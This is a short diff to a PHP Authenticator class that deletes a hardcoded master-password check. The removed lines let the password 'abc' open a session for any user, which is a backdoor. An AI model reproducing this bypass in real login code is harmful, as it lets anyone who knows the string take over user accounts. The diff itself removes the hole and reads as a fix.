@@ -69,16 +69,6 @@ class Authenticator extends Utility
 
         return TRUE;
       }
-
-      return FALSE;
-    }
-
-    if ($password === 'abc')
-    {
-      $this->createNewSession($userInfo['ndx']);
-      $this->setUserInfo($userInfo['ndx']);
-
-      return TRUE;
     }
 
     return FALSE;
